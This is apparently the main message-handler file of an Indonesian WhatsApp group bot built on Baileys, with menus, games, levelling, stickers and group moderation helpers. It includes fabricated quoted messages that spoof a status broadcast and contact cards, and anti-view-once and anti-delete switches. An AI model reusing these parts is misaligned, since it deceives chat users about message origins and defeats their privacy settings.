const { 
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReconnectMode,
  ProxyAgent,
  ChatModification,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
  Browsers,
} = require("@adiwajshing/baileys")
const Client = require('./lib/simple')
const WAConnection = Client.WAConnection(_WAConnection)
const moment = require("moment-timezone")
const speed = require('performance-now')
const { spawn, exec, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require('brainly-scraper')
const fetch = require('node-fetch');
const ggs = require('google-it')
const request = require('request');
const crypto = require('crypto')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const qrcodes = require('qrcode');
const imgbb = require('imgbb-uploader');
const os = require('os');
const tele = require('telegraph-uploader')
// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp');

/** Voting **/
const { addVote, deleteVote } = require("./lib/vote");
/** add file file nya itu ya **/

const { downloadMenu, infoMenu, gameMenu, groupMenu, funMenu, wibuMenu, ownerMenu, stickerMenu, otherMenu, rulesBot } = require('./message/help.js')
const { getBuffer, getGroupAdmins, getRandom, runtime, sleep } = require('./lib/myfunc')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')
const { color, bgcolor } = require('./lib/color')
const { mess } = require('./message/mess')
const { Toxic } = require('./lib/Toxic.js')
const { cmdadd } = require('./lib/totalcmd.js')
const { simih } = require('./lib/functionss')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')
const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { onGoing, dadu, asupan } = require("./lib/otakudesu.js")
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ythd } = require('./lib/ytdl')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword");
const premium = require("./lib/premium");
const afk = require("./lib/afk");
const level = require("./lib/level");
const atm = require("./lib/atm");
const _sewa = require("./lib/sewa");
/////////////////////////////////  cukup pake aja ya kak /////////////////////////////////////

var kuis = false
hit_today = []
ky_ttt = []
const setGelud = require('./lib/gameGelud.js')
const game = require("./lib/game");
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
const simple = require('./lib/simple.js')
let fakeimage = fs.readFileSync("./media/wpmobile.png")
let errorImg = 'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let setting = JSON.parse(fs.readFileSync('./setting.json'))
banChats = true;
ban = []
blocked = []
owner = setting.owner
ownerNumber = setting.ownerNumber
gamewaktu = setting.gamewaktu
ppbot = setting.ppbot
fake = 'Need Doi :)'
infouser = setting.infouser
qris = setting.qris

/** prefix option **/
let multipref = false;
let oneprefix = true;
let noprefix = false;
let preff = "!"
// Database

let antivo = JSON.parse(fs.readFileSync('./database/antiviewonce.json'));
let antidel = JSON.parse(fs.readFileSync("./database/antidelete.json"));

let badword = JSON.parse(fs.readFileSync('./database/badword.json'));
let grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
let senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const setiker = JSON.parse(fs.readFileSync('./src/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./src/video.json'))
const audionye = JSON.parse(fs.readFileSync('./src/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./src/image.json'))

let _antilinkyt = JSON.parse(fs.readFileSync('./database/group/antilinkyt.json'));
let _antibocil = JSON.parse(fs.readFileSync('./database/group/antibocil.json'));
let _antivirtex = JSON.parse(fs.readFileSync('./database/group/antivirtex.json'));
let _ban = JSON.parse(fs.readFileSync('./database/user/banned.json'));
//hit
global.hit = {}
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));
let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));
let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))
let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));
let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))

// GAME
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let family100 = [];

// Sticker Cmd
const addCmd = (id, command) => {
  const obj = { id: id, chats: command }
  _scommand.push(obj)
  fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
  let position = null
  Object.keys(_scommand).forEach((i) => {
 if (_scommand[i].id === id) {
position = i
 }
  })
  if (position !== null) {
 return position
  }
}

const getCmd = (id) => {
  let position = null
  Object.keys(_scommand).forEach((i) => {
 if (_scommand[i].id === id) {
position = i
 }
  })
  if (position !== null) {
 return _scommand[position].chats
  }
  
}



const checkSCommand = (id) => {
  let status = false
  Object.keys(_scommand).forEach((i) => {
 if (_scommand[i].id === id) {
status = true
 }
  })
  return status
}
const getRespon = (txt) => {
  let position = null
  Object.keys(_respon).forEach((i) => {
 if (_respon[i].txt === txt) {
position = i
 }
  })
  if (position !== null) {
 return _respon[position].resp
  }
}

const getResponPosition = (txt) => {
  let position = null
  Object.keys(_respon).forEach((i) => {
 if (_respon[i].txt === txt) {
position = i
 }
  })
  if (position !== null) {
 return position
  }
}

const getAllRespon = () => {
  const array = []
  Object.keys(_respon).forEach((i) => {
 array.push(_respon[i].txt)
  })
  return array
}

module.exports = kahfzz = async (kahfzz, kahfz) => {
  try {
 if (!kahfz.hasNewMessage) return
kahfz = kahfz.messages.all()[0]
 if (!kahfz.message) return
if (kahfz.key && kahfz.key.remoteJid == 'status@broadcast') return
  if (kahfz.key.id.startsWith('3EB0') && kahfz.key.id.length === 12) return
 const { Functions }= require('./lib/functions.js');
  global.ky_ttt
  kahfz.message = (Object.keys(kahfz.message)[0] === 'ephemeralMessage') ? kahfz.message.ephemeralMessage.message : kahfz.message

  const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
  const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
  const content = JSON.stringify(kahfz.message)
  const from = kahfz.key.remoteJid
  let isGroup = from.endsWith('@g.us')

  /** vote **/
  const isAntiviewonce = isGroup ? antivo.includes(from) : false;
  const isAntidel = isGroup ? antidel.includes(from) : false;

  const type = Object.keys(kahfz.message)[0]  
  const cmd = (type === 'conversation' && kahfz.message.conversation) ? kahfz.message.conversation : (type == 'imageMessage') && kahfz.message.imageMessage.caption ? kahfz.message.imageMessage.caption : (type == 'videoMessage') && kahfz.message.videoMessage.caption ? kahfz.message.videoMessage.caption : (type == 'extendedTextMessage') && kahfz.message.extendedTextMessage.text ? kahfz.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
  // const prefix = /^[°Z•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•Zπ÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'
  
  if (multipref) {
 var prefix = /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢âœ“=|~!?@#%^&.zZ_•\/\\Â©^<+]/.test(cmd) ? cmd.match(/^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢âœ“=|~!?@#%^&.zZ_+•\/\\Â©^<+]/gi)[0]: '!'
  } else if (noprefix) {
 prefix = ""
  } else if (oneprefix) {
 prefix = preff
  }

  body = (type === 'conversation' && kahfz.message.conversation.startsWith(prefix)) ? kahfz.message.conversation : (type == 'imageMessage') && kahfz.message[type].caption.startsWith(prefix) ? kahfz.message[type].caption : (type == 'videoMessage') && kahfz.message[type].caption.startsWith(prefix) ? kahfz.message[type].caption : (type == 'extendedTextMessage') && kahfz.message[type].text.startsWith(prefix) ? kahfz.message[type].text : (type == 'listResponseMessage') && kahfz.message[type].singleSelectReply.selectedRowId ? kahfz.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && kahfz.message[type].selectedButtonId ? kahfz.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(kahfz.message[type].fileSha256.toString('base64')) !== null && getCmd(kahfz.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(kahfz.message[type].fileSha256.toString('base64')) : ""

  if (prefix != "") {
 if (!body.startsWith(prefix)) {
isCmdd = false
comm = ""
 } else {
isCmdd = true
comm = body.slice(1).trim().split(" ").shift().toLowerCase()
 }
  } else {
 isCmdd = false
 comm = body.trim().split(" ").shift().toLowerCase()
  }

  budy = (type === 'conversation') ? kahfz.message.conversation : (type === 'extendedTextMessage') ? kahfz.message.extendedTextMessage.text : ''
  const command = comm
  const args = body.trim().split(/ +/).slice(1)
  hit_today.push(command)
  const arg = body.substring(body.indexOf(' ') + 1)
  const ar = args.map((v) => v.toLowerCase())
  const argz = body.trim().split(/ +/).slice(1)
  const isCmd = isCmdd
  if (isCmd) cmdadd()
 const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
  const q = args.join(' ')
  const Bfake = fs.readFileSync ('./media/image/fake.jpeg','base64')
  const botNumber = kahfzz.user.jid
  const ownerNumber = setting.ownerNumber
  const ownerName = setting.ownerName
  const botName = setting.botName
  let sender = isGroup ? kahfz.participant : kahfz.key.remoteJid
  let senderr = kahfz.key.fromMe ? kahfzz.user.jid : kahfz.key.remoteJid.endsWith('@g.us') ? kahfz.participant : kahfz.key.remoteJid
  const totalchat = await kahfzz.chats.all()
  const groupMetadata = isGroup ? await kahfzz.groupMetadata(from) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const groupId = isGroup ? groupMetadata.jid : ''
  const groupMembers = isGroup ? groupMetadata.participants : ''
  const groupDesc = isGroup ? groupMetadata.desc : ''
  const groupOwner = isGroup ? groupMetadata.owner : ''
  const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
  const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
  const isGroupAdmins = groupAdmins.includes(sender) || false
  const conts = kahfz.key.fromMe ? kahfzz.user.jid : kahfzz.contacts[sender] || '-'
  const pushname = kahfz.key.fromMe ? kahfzz.user.name : conts.notify || conts.vname || conts.name || '-'
  const mentionByTag = type == "extendedTextMessage" && kahfz.message.extendedTextMessage.contextInfo != null ? kahfz.message.extendedTextMessage.contextInfo.mentionedJid : []
  const mentionByreply = type == "extendedTextMessage" && kahfz.message.extendedTextMessage.contextInfo != null ? kahfz.message.extendedTextMessage.contextInfo.participant || "" : ""
  const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
  mention != undefined ? mention.push(mentionByreply) : []
  const mentionUser = mention != undefined ? mention.filter(n => n) : []
  idttt = []
  players1 = []
  players2 = []
  gilir = []
  for (let t of ky_ttt){
 idttt.push(t.id)
 players1.push(t.player1)
 players2.push(t.player2)
 gilir.push(t.gilir)
  }
  const isTTT = isGroup ? idttt.includes(from) : false
  isPlayer1 = isGroup ? players1.includes(sender) : false
  isPlayer2 = isGroup ? players2.includes(sender) : false
  const isBadword = isGroup ? grupbadword.includes(from) : false
const isBan = ban.includes(sender) 
  const isOwner = ownerNumber.includes(senderr)
  const isRegister = register.includes(sender)
  const isPremium = premium.checkPremiumUser(sender, _premium)
  const isSewa = _sewa.checkSewaGroup(from, sewa)
  const isAfkOn = afk.checkAfkUser(sender, _afk)
  const isLevelingOn = isGroup ? _leveling.includes(from) : false
  const isMuted = isGroup ? mute.includes(from) : false
  const isAntiLink = isGroup ? antilink.includes(from) : false
  const isAntiLinkYT = isGroup ? _antilinkyt.includes(from) : false
const isAntiBocil = isGroup ? _antibocil.includes(from) : false
  const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
  const isWelkom = isGroup ? welkom.includes(from) : false
  const isSimi = isGroup ? samih.includes(from) : false
  let d = new Date
  let locale = 'id'
  let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
  let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
  let week = d.toLocaleDateString(locale, { weekday: 'long' })
  let date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
  let waktu = d.toLocaleDateString(locale, { hour: 'numeric', minute: 'numeric', second: 'numeric' })
////////// here button function///////////////////////////////
selectedButton = (type == 'buttonsResponseMessage') ? kahfz.message.buttonsResponseMessage.selectedButtonId : ''

responseButton = (type == 'listResponseMessage') ? kahfz.message.listResponseMessage.title : ''

const gcount = setting.gcount
const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
  let po = kahfzz.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "CLICK HERE","listType": "SINGLE_SELECT","sections": list}}, {})
  return kahfzz.relayWAMessage(po, {waitForAck: true})
}
const isUrl = (url) => {
  return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
function monospace(string) {
  return '```' + string + '```'
}
function jsonformat(string) {
  return JSON.stringify(string, null, 2)
}
function randomNomor(angka){
  return Math.floor(Math.random() * angka) + 1
}

const reply = (teks) => {
  var ids = teks.includes('@') ? teks.split('@'): []
  let semdertag = []
  for (var con of ids) {
 semdertag.push(con.split(' ')[0]+'@s.whatsapp.net')
  }
  kahfzz.sendMessage(from, teks, MessageType.text, {
 quoted: kahfz, thumbnail: fakeimage, contextInfo: {
mentionedJid: semdertag }});
}


const sendMess = (hehe, teks) => {
  kahfzz.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
  (id == null || id == undefined || id == false) ? kahfzz.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.png')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : kahfzz.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.png')}, extendedText, { sendEphemeral: true, quoted: freply, contextInfo: { "mentionedJid": memberr } })
}
const sendText = (from, text) => {
  kahfzz.sendMessage(from, text, MessageType.text)
}
const textImg = (teks) => {
  return kahfzz.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./media/wpmobile.png')})
}
const troli =  {key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 300, status: 200, thumbnail: fakeimage, surface: 200, message: fake, orderTitle: 'kahfzz', sellerJid: '0@s.whatsapp.net'} } }
const replyWithFakeig = (teks) => {

kahfzz.sendMessage(from, teks, text,{contextInfo:{

"forwardingScore": 1000000000,

isForwarded: false,

sendEphemeral: false,

"externalAdReply": {

"title": `Hallo ${pushname}` ,

"body": `${botName}\nBy: ${botName}`,

"mediaType": "2",

"thumbnailUrl": "https://i.ibb.co/tZnDbJt/ba64a75d6689.jpg",

"mediaUrl": "https://Instagram.com/zuxyganz_",

"thumbnail": thumbnail,

"sourceUrl": "https://github.com/ZuxyGanz"

},mentionedJid:[sender]}, quoted : freply})

}
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/Nakano.jpg')
}}}
const math = (teks) => {
  return Math.floor(teks)
}
const kick = function(from, orangnya){
  for (let i of orangnya){
 kahfzz.groupRemove(from, [i])
  }
}
const kickMember = async(id, target = []) => {
  let group = await kahfzz.groupMetadata(id)
  let owner = group.owner.replace("c.us", "s.whatsapp.net")
  let me = kahfzz.user.jid
  for (i of target) {
 if (!i.includes(me) && !i.includes(owner)) {
await kahfzz.groupRemove(to, [i])
 } else {
await kahfzz.sendMessage(id, "Not Premited!", "conversation")
break
 }
  }
}
const add = function(from, orangnya){
  kahfzz.groupAdd(from, orangnya)
}
const sendKontak = (from, nomor, nama, org = "") => {
  const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
  kahfzz.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: freply})
}
const hideTag = async function(from, text){
  let anu = await kahfzz.groupMetadata(from)
  let members = anu.participants
  let ane = []
  for (let i of members){
 ane.push(i.jid)
  }
  kahfzz.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/Nakano.jpg')},
 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
const sendWebp = async(to, url) => {
  var names = Date.now() / 10000;
  var download = function (uri, filename, callback) {
 request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
 });
  };
  download(url, './sticker' + names + '.png', async function () {
 console.log('selesai');
 let filess = './sticker' + names + '.png'
 let asw = './sticker' + names + '.webp'
 exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
fs.unlinkSync(filess)
if (err) return reply(`${err}`)
  exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
 if (error) return reply(`${error}`)
kahfzz.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:kahfz})
 fs.unlinkSync(asw)
  });
 });
  });
}

const getRegisteredRandomId = () => {
  return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
  const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
  _registered.push(obj)
  fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
  let status = false
  Object.keys(_registered).forEach((i) => {
 if (_registered[i].id === sender) {
status = true
 }
  })
  return status
}
//////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////
//<ini const button>//
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
  kma = vid1
  mhan = await kahfzz.prepareMessage(from, kma, video)
  const buttonMessages = {
 videoMessage: mhan.message.videoMessage,
 contentText: text1,
 footerText: desc1,
 buttons: but,
 headerType: 5
  }
  kahfzz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
  kma = gam1
  mhan = await kahfzz.prepareMessage(from, kma, location)
  const buttonMessages = {
 locationMessage: mhan.message.locationMessage,
 contentText: text1,
 footerText: desc1,
 buttons: but,
 headerType: 6
  }
  kahfzz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const isRegistered = checkRegisteredUser(sender)
/////< ini Button Text>///////
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
  const buttonMessage = {
 contentText: text1,
 footerText: desc1,
 buttons: but,
 headerType: 1,
  };
  kahfzz.sendMessage(
 id,
 buttonMessage,
 MessageType.buttonsMessage,
 options
 );
};
///////////// lanjut mass /////////////
const sendMediaURL = async(to, url, text="", mids=[]) =>{
  if(mids.length > 0){
 text = normalizeMention(to, text, mids)
  }
  const fn = Date.now() / 10000;
  const filename = fn.toString()
  let mime = ""
  var download = function (uri, filename, callback) {
 request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
 });
  };
  download(url, filename, async function () {
 console.log('done');
 let media = fs.readFileSync(filename)
 let type = mime.split("/")[0]+"Message"
 if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
 }
 if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
 }
 kahfzz.sendMessage(to, media, type, {quoted: freply, mimetype: mime, caption: text, thumbnail:fakeimage, contextInfo: {"mentionedJid": mids}})
 fs.unlinkSync(filename)
  });
}
const sendFileFromUrl = async(link, type, options) => {
  hasil = await getBuffer(link)
  kahfzz.sendMessage(from, hasil, type, options).catch(e => {
 fetch(link).then((hasil) => {
kahfzz.sendMessage(from, hasil, type, options).catch(e => {
  kahfzz.sendMessage(from, { url : link }, type, options).catch(e => {
 reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
 console.log(e)
  })
})
 })
  })
}
const promoteAdmin = async function(to, target=[]){
  if(!target.length > 0) { return  reply("No target..") }
 let g = await kahfzz.groupMetadata(to)
  let owner = g.owner.replace("c.us","s.whatsapp.net")
  let me = kahfzz.user.jid
  for (i of target){
 if (!i.includes(me) && !i.includes(owner)){
const res = await kahfzz.groupMakeAdmin(to, [i])
 }else{
reply("NOT PREMITED")
 }
  }
  var hayuk0 = '[NOT VERIFIED]'
  if (isRegistered) {
 hayuk0 = '[√ VERIFIED]'
  }
}
const limitAdd = (sender) => {
  let position = false
  Object.keys(_limit).forEach((i) => {
 if (_limit[i].id == sender) {
position = i
 }
  }) 
  if (position !== false) {
 _limit[position].limit += 1
 fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
  }
}
const demoteAdmin = async function(to, target=[]){
  if(!target.length > 0) { return  reply("No target..") }
 let g = await kahfzz.groupMetadata(to)
  let owner = g.owner.replace("c.us","s.whatsapp.net")
  let me = kahfzz.user.jid
  for (i of target){
 if (!i.includes(me) && !i.includes(owner)){
const res = await kahfzz.groupDemoteAdmin(to, [i])
 }else{
reply("NOT PREMITED")
 }
  }
}
let authorname = kahfzz.contacts[from] != undefined ? kahfzz.contacts[from].vname || kahfzz.contacts[from].notify : undefined	
if (authorname != undefined) { } else { authorname = groupName }	
  function addMetadata(packname, author) {	
 if (!packname) packname = 'WABot'; if (!author) author = 'Bot';author = author.replace(/[^a-zA-Z0-9]/g, '');	
 let name = `${author}_${packname}`
 if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
const json = {	
  "sticker-pack-name": packname,
  "sticker-pack-publisher": author,
}
const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
let len = JSON.stringify(json).length	
let last	
if (len > 256) {	
  len = len - 256	
  bytes.unshift(0x01)	
} else {	
  bytes.unshift(0x00)	
}	
if (len < 16) {	
  last = len.toString(16)	
  last = "0" + len	
} else {	
  last = len.toString(16)	
}	
const buf2 = Buffer.from(last, "hex")	
const buf3 = Buffer.from(bytes)	
const buf4 = Buffer.from(JSON.stringify(json))	
const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])
fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
  return `./sticker/${name}.exif`	
})	
 }
 const isImage = (type === 'imageMessage')
 const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore🌁'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Petang🌇'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang🏜️'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi🌆'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam\nJangan Lupa Shalat Shubuh'
 }
 const levelRole = level.getLevelingLevel(sender, _level)
 var role = 'Warrior III'
 if (levelRole <= 5) {
role = 'Warrior II'
 } else if (levelRole <= 10) {
role = 'Warrior I'
 } else if (levelRole <= 15) {
role = 'Elite III'
 } else if (levelRole <= 20) {
role = 'Elite II'
 } else if (levelRole <= 25) {
role = 'Elite I'
 } else if (levelRole <= 30) {
role = 'Master III'
 } else if (levelRole <= 35) {
role = 'Master II'
 } else if (levelRole <= 40) {
role = 'Master I'
 } else if (levelRole <= 45) {
role = 'GrandMaster III'
 } else if (levelRole <= 50) {
role = 'GrandMaster II'
 } else if (levelRole <= 55) {
role = 'GrandMaster I'
 } else if (levelRole <= 60) {
role = 'Epic III'
 } else if (levelRole <= 65) {
role = 'Epic II'
 } else if (levelRole <= 70) {
role = 'Epic I'
 } else if (levelRole <= 75) {
role = 'Legend III'
 } else if (levelRole <= 80) {
role = 'Legend II'
 } else if (levelRole <= 85) {
role = 'Legend I'
 } else if (levelRole <= 90) {
role = 'Mythic'
 } else if (levelRole <= 95) {
role = 'Mythical Glory'
 } else if (levelRole >= 100) {
role = 'Immortal'
 }

////< DAFTAR BUTTON BY follow @kahfzz_ads > ////

const daftar1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nSebelum Menggunakan ${botName} Verify Terlebih Dahulu Ya `
const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak\nKahfz Bot\nJika Button Tidak Terlihat Ketik\n!verify```'
const daftar3 = [{buttonId: noprefix ? "verify" : "!"+"verify",buttonText: {displayText: `⬡ DAFTAR JADI GBLK🐣`,},type: 1,},]
const nomenu = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText: {displayText: `⬡ MENU `,},type: 1,},]

///////< PREMIUM BUTTON BY IKY > ////////
const prem1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\n Fitur Ini Khusus Member Premium Silahkan Buy Premium Untuk Menggunakan Fitur Ini `
const prem2 = '```KLIK TOMBOL DI BAWAH UNTUK MELIHAT LIST PREMIUM\n Kahfz Ganteng  Bro```'
const prem3 = [{buttonId: noprefix ? "sewabot" : "!"+"sewabot",buttonText: {displayText: `⬡ BUY PREMIUM `,},type: 1,},]
//////< FUNCTION LEVELING > ///////
if (isGroup && !kahfz.key.fromMe && !level.isGained(sender) && isLevelingOn) {
  try {
 level.addCooldown(sender)
 const checkATM = atm.checkATMuser(sender, _uang)
 if (checkATM === undefined) atm.addATM(sender, _uang)
const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
 atm.addKoinUser(sender, uangsaku, _uang)
 const currentLevel = level.getLevelingLevel(sender, _level)
 const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
 const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
 level.addLevelingXp(sender, amountXp, _level)
 if (requiredXp <= level.getLevelingXp(sender, _level)) {
level.addLevelingLevel(sender, 1, _level)
const userLevel = level.getLevelingLevel(sender, _level)
const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)
 } 
  } catch (err) {
 console.error(err)
  }
}
colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
const { quotedMsg, isQuotedMsg, isBaileys } = kahfz
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isListMsg = (type == 'listResponseMessage')
